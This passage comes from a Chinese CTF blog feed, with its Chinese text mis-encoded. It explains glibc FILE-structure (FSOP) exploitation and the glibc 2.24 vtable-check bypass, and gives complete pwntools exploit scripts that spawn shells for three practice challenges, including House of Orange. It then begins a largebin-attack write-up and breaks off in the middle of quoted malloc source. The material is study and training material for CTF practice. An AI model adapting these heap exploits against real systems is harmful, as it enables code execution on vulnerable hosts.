Programming</p><p>å…³é”®ç‚¹ï¼š_IO_list_allæŒ‡é’ˆ</p><p>åœ¨æ²¡æœ‰æ¶‰åŠåˆ°æ–‡ä»¶çš„æ“ä½œæ—¶ï¼Œé“¾è¡¨æ˜¯è¿™æ ·çš„ï¼š_IO_list_all -&gt; stderrï¼Œstderr._chain -&gt; stdoutï¼Œstdout._chain -&gt; stdinï¼ŒFSOPå°±æ˜¯ä¼ªé€ ä¸€å—_IO_FILE_plusç»“æ„ä½“ä»£æ›¿åŸæœ¬çš„èŠ‚ç‚¹ï¼Œå†åˆ©ç”¨æ¼æ´ä¿®æ”¹_IO_list_allçš„å€¼ä¸ºå¯æ§çš„å†…å­˜åŒºåŸŸ</p><p>ä¼ªé€ ä¹‹åè¿˜éœ€è¦è§¦å‘ï¼Œè§¦å‘çš„æ–¹æ³•æ˜¯è°ƒç”¨_IO_flush_all_lockpå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šåˆ·æ–°é“¾è¡¨ä¸­çš„æ–‡ä»¶æµï¼Œç›¸å½“äºå¯¹æ¯ä¸ªFILEè°ƒç”¨fflushï¼Œå¯¹åº”ä¼šè°ƒç”¨vtableä¸­çš„_IO_overflow</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="comment">// åˆ¤æ–­ç¼“å†²åŒºæ˜¯å¦æœ‰æ•°æ®ï¼Œæœ‰åˆ™åˆ·æ–°</span></span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å¦‚ä¸‹æƒ…å†µä¸­è¿™ä¸ªå‡½æ•°ä¼šè¢«ç³»ç»Ÿè°ƒç”¨</p><ol><li>libcæ‰§è¡Œabortæ—¶</li><li>æ‰§è¡Œexitå‡½æ•°æ—¶</li><li>mainå‡½æ•°è¿”å›æ—¶ï¼ˆæ‰§è¡Œäº†exitå‡½æ•°ï¼‰</li></ol><h3 id="ciscn-2019-n-7"><a href="#ciscn-2019-n-7" class="headerlink" title="ciscn_2019_n_7"></a>ciscn_2019_n_7</h3><p>æ¼æ´æ˜¯å¯ä»¥æº¢å‡ºè¦†ç›–heap managerçš„æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºä»»æ„åœ°å€å†™</p><p>æ€è·¯å°±æ˜¯å°†æŒ‡é’ˆå†™ä¸ºstderrï¼Œç„¶åç›´æ¥åœ¨stderrä¸­å†™ï¼ŒæŠŠæŸäº›å­—æ®µæ”¹æˆsystemåœ°å€ï¼Œvtableæ”¹ä¸ºè¿™ä¸ªå­—æ®µçš„åœ°å€-0x18ï¼ˆvtableçš„ç¬¬å››ä¸ªå­—æ®µä¸ºoverflowï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">backdoor()</span><br><span class="line">ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(re(<span class="number">12</span>, <span class="number">0</span>), base=<span class="number">16</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc.address = leak</span><br><span class="line">echo(<span class="built_in">hex</span>(leak))</span><br><span class="line">payload = <span class="string">&quot;/bin/sh\x00&quot;</span> + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">1</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]) * <span class="number">0x4</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&quot;_IO_2_1_stderr_&quot;</span>] + <span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">0xe0</span>, <span class="string">&quot;lemon\x00\x00\x00&quot;</span> + p64(libc.sym[<span class="string">&quot;_IO_2_1_stderr_&quot;</span>]))</span><br><span class="line">edit(<span class="string">&quot;lemon&quot;</span>, payload)</span><br><span class="line">ru(menu)</span><br><span class="line">sl(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(<span class="string">&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>äººä¸ºéœ€è¦è®¡ç®—ä¸€ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨pwn_debugï¼Œä½¿å¾—expæ„é€ æ›´ç®€å•ä¸€äº›</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">backdoor()</span><br><span class="line">ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(re(<span class="number">12</span>, <span class="number">0</span>), base=<span class="number">16</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc.address = leak</span><br><span class="line">echo(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">fake_file = IO_FILE_plus()</span><br><span class="line">fake_file._flags = <span class="number">0x0068732f6e69622f</span></span><br><span class="line">fake_file._IO_write_ptr = <span class="number">1</span> </span><br><span class="line">fake_file._IO_write_base = <span class="number">0</span></span><br><span class="line">fake_file._IO_save_end = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">fake_file.vtable = libc.sym[<span class="string">&quot;_IO_2_1_stderr_&quot;</span>] + <span class="number">0x40</span></span><br><span class="line">fake_file.show()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe0</span>, <span class="string">&quot;lemon\x00\x00\x00&quot;</span> + p64(libc.sym[<span class="string">&quot;_IO_2_1_stderr_&quot;</span>]))</span><br><span class="line">edit(<span class="string">&quot;lemon&quot;</span>, <span class="built_in">str</span>(fake_file))</span><br><span class="line">ru(menu)</span><br><span class="line">sl(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(<span class="string">&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="glibc2-24æ–°å¢ä¿æŠ¤"><a href="#glibc2-24æ–°å¢ä¿æŠ¤" class="headerlink" title="glibc2.24æ–°å¢ä¿æŠ¤"></a>glibc2.24æ–°å¢ä¿æŠ¤</h2><h5 id="IO-str-jumpåœ°å€ç¡®å®š"><a href="#IO-str-jumpåœ°å€ç¡®å®š" class="headerlink" title="_IO_str_jumpåœ°å€ç¡®å®š"></a>_IO_str_jumpåœ°å€ç¡®å®š</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p _IO_str_underflow</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">    &lt;text variable, no debug info&gt;&#125; <span class="number">0x7f4d4cf04790</span> &lt;_IO_str_underflow&gt;</span><br><span class="line">pwndbg&gt; search -p <span class="number">0x7f4d4cf04790</span></span><br><span class="line">libc.so<span class="number">.6</span>       <span class="number">0x7f4d4d2240a0</span> <span class="number">0x7f4d4cf04790</span></span><br><span class="line">libc.so<span class="number">.6</span>       <span class="number">0x7f4d4d224160</span> <span class="number">0x7f4d4cf04790</span></span><br><span class="line">libc.so<span class="number">.6</span>       <span class="number">0x7f4d4d2245e0</span> <span class="number">0x7f4d4cf04790</span></span><br><span class="line">pwndbg&gt; p &amp;_IO_file_jumps</span><br><span class="line">$<span class="number">2</span> = (&lt;data variable, no debug info&gt; *) <span class="number">0x7f4d4d224440</span> &lt;_IO_file_jumps&gt;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">IO_file_jumps_offset = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">IO_str_underflow_offset = libc.sym[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">    possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">        <span class="built_in">print</span> possible_IO_str_jumps_offset</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>åœ¨ 2.24 ç‰ˆæœ¬çš„ glibc ä¸­ï¼Œå…¨æ–°åŠ å…¥äº†é’ˆå¯¹ _IO_FILE_plus çš„ vtable åŠ«æŒçš„æ£€æµ‹æªæ–½ï¼Œglibc ä¼šåœ¨è°ƒç”¨è™šå‡½æ•°ä¹‹å‰é¦–å…ˆæ£€æŸ¥ vtable åœ°å€çš„åˆæ³•æ€§ã€‚é¦–å…ˆä¼šéªŒè¯ vtable æ˜¯å¦ä½äº_IO_vtable æ®µä¸­ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶å°±æ­£å¸¸æ‰§è¡Œï¼Œå¦åˆ™ä¼šè°ƒç”¨_IO_vtable_check åšè¿›ä¸€æ­¥æ£€æŸ¥ã€‚</p><p><code>__start___libc_IO_vtables</code>æŒ‡å‘ç¬¬ä¸€ä¸ªvtableåœ°å€<code>_IO_helper_jumps</code>ï¼Œè€Œ<code>__stop___libc_IO_vtables</code>æŒ‡å‘æœ€åä¸€ä¸ªvtable<code>_IO_str_chk_jumps</code>ç»“æŸçš„åœ°å€ï¼Œæ‰€ä»¥è¦ä¿è¯åˆ©ç”¨çš„æ‰‹æ³•åœ¨è¿™ä¸ªvtableæ®µä¸­ã€‚</p><p>ç›´æ¥å†™å‡ºåˆ©ç”¨æ‰‹æ³•å¦‚ä¸‹ï¼š</p><blockquote><p>fp-&gt;_mode = 0</p><p>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</p><p>fp-&gt;_IO_read_ptr = 0x61ï¼ˆsmallbin sizeï¼‰</p><p>fp-&gt;_IO_read_base = _IO_list_all - 0x10</p><p>ä¸Šé¢æ˜¯åšHOOçš„æ—¶å€™å¯ä»¥ç”¨åˆ°çš„tips</p><p>vtable = _IO_str_jumps - 8ï¼ˆä½¿å¾—_IO_str_finishå‡½æ•°æˆä¸ºäº†ä¼ªé€ çš„vtableçš„_IO_OVERFLOWï¼Œ<code>_IO_str_finish</code>åç§»ä¸º<code>_IO_str_jumps</code>ä¸­0x10ï¼Œè€Œ<code>_IO_OVERFLOW</code>ä¸º0x18ï¼‰</p><p>fp-&gt;_flagsçš„æœ€ä½ä½ä¸º0</p><p>fp-&gt;_IO_buf_base = binsh_addrï¼ˆä½œä¸ºå‚æ•°ï¼‰</p><p>fp-&gt;_s._free_buffer = system æˆ–è€… ogï¼ˆfp + 0xe8ï¼‰</p></blockquote><p>é€šè¿‡ä»¥ä¸Šæ„é€ å¯ä»¥ä½¿å¾—è°ƒç”¨<code>(fp-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base)</code>ï¼Œ<code>fp-&gt;_IO_buf_base</code>ä¸ºç¬¬ä¸€ä¸ªå‚æ•°</p><h3 id="babyprintf"><a href="#babyprintf" class="headerlink" title="babyprintf"></a>babyprintf</h3><p>æ— é™å †æº¢å‡ºï¼ŒæŒ‰ç…§å¦‚ä¸Šçš„æ„é€ æ–¹æ³•æ¥æ„é€ å³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn_debug.pwn_debug <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn_debug.IO_FILE_plus <span class="keyword">import</span> *</span><br><span class="line">pdbg=pwn_debug(<span class="string">&quot;babyprintf&quot;</span>)</span><br><span class="line"></span><br><span class="line">pdbg.context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pdbg.local()</span><br><span class="line">pdbg.debug(<span class="string">&quot;2.24&quot;</span>)</span><br><span class="line">pdbg.remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">22</span>)</span><br><span class="line"><span class="comment">#p=pdbg.run(&quot;local&quot;)</span></span><br><span class="line"><span class="comment">#p=pdbg.run(&quot;remote&quot;)</span></span><br><span class="line">p=pdbg.run(<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">membp=pdbg.membp</span><br><span class="line"><span class="comment">#print type(pdbg.membp)</span></span><br><span class="line"><span class="comment">#print hex(membp.elf_base),hex(membp.libc_base)</span></span><br><span class="line">elf=pdbg.elf</span><br><span class="line">libc=pdbg.libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_one</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;string: &quot;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;result: &quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#pdbg.bp([0x4007f0])</span></span><br><span class="line">    <span class="comment"># step 1 leaking libc address and overwrite top chunk size</span></span><br><span class="line">    data=<span class="string">&quot;%p%p%p%p%p**%p**&quot;</span></span><br><span class="line">    data=data.ljust(<span class="number">0x2f8</span>,<span class="string">&#x27;*&#x27;</span>)+p64(<span class="number">0xd01</span>)</span><br><span class="line">    write_one(<span class="number">0x2f0</span>,data)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;**&quot;</span>)</span><br><span class="line">    libc_base=<span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;**&quot;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">240</span></span><br><span class="line">    io_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    io_str_jumps=libc_base+libc.symbols[<span class="string">&#x27;_IO_str_jumps&#x27;</span>]</span><br><span class="line">    binsh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">    system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;leaking libc base: %s&quot;</span>%<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="comment">#pdbg.bp()</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># step 2 trigger sysmalloc</span></span><br><span class="line">    write_one(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    fake_file=IO_FILE_plus()</span><br><span class="line">    fake_file._IO_read_ptr=<span class="number">0x61</span></span><br><span class="line">    fake_file._IO_read_base=io_list_all-<span class="number">0x10</span></span><br><span class="line">    fake_file._IO_buf_base=binsh_addr</span><br><span class="line">    fake_file._IO_write_ptr=<span class="number">1</span></span><br><span class="line">    fake_file.vtable=io_str_jumps-<span class="number">8</span></span><br><span class="line"></span><br><span class="line">    fake_file.show()</span><br><span class="line">    fake_file.str_finish_check()</span><br><span class="line">    file_data=<span class="built_in">str</span>(fake_file)+p64(system_addr)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#fake_chunk=p64(0)+p64(0x61)+p64(io_list_all-0x10)*2</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2f0</span></span><br><span class="line">    payload+=file_data</span><br><span class="line">    <span class="comment">## step 3 overwrite unsorted-&gt;bk</span></span><br><span class="line">    write_one(<span class="number">0x2f0</span>,payload)</span><br><span class="line">    <span class="comment">#pdbg.bp(0x4007d2)</span></span><br><span class="line">    <span class="comment">## step 4 malloc again, trigger unsorted attack and _IO_flush_all_lokcp</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.interactive() <span class="comment">#get the shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   pwn()</span><br></pre></td></tr></table></figure><h3 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h3><p>ä»»æ„å †æº¢å‡ºæ¼æ´ï¼Œeditå¯ç¼–è¾‘sizeå¤§å°</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn_debug <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&quot;./pwn&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29427</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/glibc/x64/2.23/lib/libc-2.23.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;../libc-2.23.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">cho = <span class="string">&#x27;Your choice : &#x27;</span>      </span><br><span class="line">siz = <span class="string">&#x27;Length of name :&#x27;</span>    </span><br><span class="line">con = <span class="string">&#x27;Name :&#x27;</span>        </span><br><span class="line">pri = <span class="string">&#x27;Price of Orange:&#x27;</span></span><br><span class="line">col = <span class="string">&#x27;Color of Orange:&#x27;</span></span><br><span class="line">ind = <span class="string">&#x27;&#x27;</span>     </span><br><span class="line">edi = <span class="string">&#x27;&#x27;</span>        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content, price, color, c=<span class="string">&#x27;1&#x27;</span></span>):</span></span><br><span class="line">    sh.sendlineafter(cho, c)</span><br><span class="line">    sh.sendlineafter(siz, <span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(con, content)</span><br><span class="line">    sh.sendlineafter(pri, <span class="built_in">str</span>(price))</span><br><span class="line">    sh.sendlineafter(col, <span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">c=<span class="string">&#x27;2&#x27;</span></span>):</span></span><br><span class="line">    sh.sendlineafter(cho, c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">length, content, price, color, c=<span class="string">&#x27;3&#x27;</span></span>):</span></span><br><span class="line">    sh.sendlineafter(cho, c)</span><br><span class="line">    sh.sendlineafter(siz, <span class="built_in">str</span>(length))</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Name:&#x27;</span>, content)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Price of Orange: &#x27;</span>, <span class="built_in">str</span>(price))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Color of Orange: &quot;</span>, <span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>, <span class="number">0x10</span>, <span class="number">0xddaa</span>)  </span><br><span class="line">payload = <span class="string">&#x27;p&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x21</span>)+p32(<span class="number">0x10</span>)+p32(<span class="number">0xddaa</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xf31</span>)</span><br><span class="line">edit(<span class="number">0xb1</span>, payload, <span class="number">0x10</span>, <span class="number">0xddaa</span>)        <span class="comment"># åŠ«æŒtop chunkçš„sizeä¸º0xf31</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>, <span class="number">0x1111</span>, <span class="number">0xddaa</span>)    <span class="comment"># top chunkæ‰å…¥unsortbin</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>, <span class="number">0x1111</span>, <span class="number">0xddaa</span>)</span><br><span class="line">show()</span><br><span class="line">heap_ptr = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = heap_ptr-<span class="number">1640</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">io_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">IO_file_jumps_offset = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">IO_str_underflow_offset = libc.sym[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">    possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">        success(<span class="built_in">hex</span>(possible_IO_str_jumps_offset))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">io_str_jumps = libc_base+possible_IO_str_jumps_offset   <span class="comment"># 0x3c34a0</span></span><br><span class="line">success(<span class="built_in">hex</span>(io_str_jumps))</span><br><span class="line"></span><br><span class="line">fake_file = p64(<span class="number">0</span>) + p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(io_list_all - <span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)<span class="comment"># _IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(binsh_addr)<span class="comment"># _IO_buf_base = binsh_addr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_file += p64(io_str_jumps - <span class="number">0x8</span>)<span class="comment"># vtable</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_file += p64(system)</span><br><span class="line"></span><br><span class="line">file_data = <span class="built_in">str</span>(fake_file) + p64(system) * <span class="number">2</span></span><br><span class="line">payload = <span class="string">&#x27;x&#x27;</span> * (<span class="number">0x540</span> - <span class="number">0x140</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + \</span><br><span class="line">    p32(<span class="number">0x666</span>) + p32(<span class="number">0xddaa</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += file_data</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x800</span>, payload, <span class="number">666</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> IO_FILEåˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>largebin attack å­¦ä¹ (ä¾‹å­æœªå®Œæˆ)</title>
      <link href="2021/07/25/largebin-attack/"/>
      <url>2021/07/25/largebin-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h2><blockquote><p>åœ¨64ä½ä¸‹ï¼Œç”³è¯·å¤§äº0x400chunkæœ€ç»ˆä¼šè¿›å…¥largebinã€‚<br>Large bins ä¸€å…±åŒ…æ‹¬63 ä¸ªbinï¼Œæ¯ä¸ªbin ä¸­çš„chunk å¤§å°ä¸æ˜¯ä¸€ä¸ªå›ºå®šå…¬å·®çš„ç­‰å·®æ•°åˆ—ï¼Œè€Œæ˜¯åˆ†æˆ6 ç»„binï¼Œæ¯ç»„bin æ˜¯ä¸€ä¸ªå›ºå®šå…¬å·®çš„ç­‰å·®æ•°åˆ—ï¼Œæ¯ç»„çš„bin æ•°é‡ä¾æ¬¡ä¸º32ã€16ã€8ã€4ã€2ã€1ï¼Œå…¬å·®ä¾æ¬¡ä¸º64Bã€512Bã€4096Bã€32768Bã€262144B ç­‰ã€‚</p></blockquote><p>æ ¹æ®ctfwikiå’Œå¸ˆå‚…ä»¬çš„æ€»ç»“ï¼š</p><ul><li>æŒ‰ç…§å¤§å°ä»å¤§åˆ°å°æ’åº</li><li>è‹¥å¤§å°ç›¸åŒ,æŒ‰ç…§freeæ—¶é—´æ’åº</li><li>è‹¥å¹²ä¸ªå¤§å°ç›¸åŒçš„å †å—,åªæœ‰é¦–å †å—çš„fd_nextsizeå’Œbk_nextsizeä¼šæŒ‡å‘å…¶ä»–å †å—,åé¢çš„å †å—çš„fd_nextsizeå’Œbk_nextsizeå‡ä¸º0</li><li>sizeæœ€å¤§çš„chunkçš„bk_nextsizeæŒ‡å‘æœ€å°çš„chunk; sizeæœ€å°çš„chunkçš„fd_nextsizeæŒ‡å‘æœ€å¤§çš„chunk</li></ul><h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p>è¿›å…¥largebinçš„ç›¸å…³ä»£ç å¦‚ä¸‹(_int_malloc)<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// å…ˆåˆ¤æ–­ä¸‹æ˜¯ä¸æ˜¯unsortedæœ¬èº«ï¼Œä¸æ˜¯å°±è¿›å…¥while</span></span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// victim = å°†è¦å…¥largebinçš„å—</span></span><br><span class="line">          bck = victim-&gt;bk; </span><br><span class="line">        <span class="comment">// æ£€æµ‹size</span></span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span 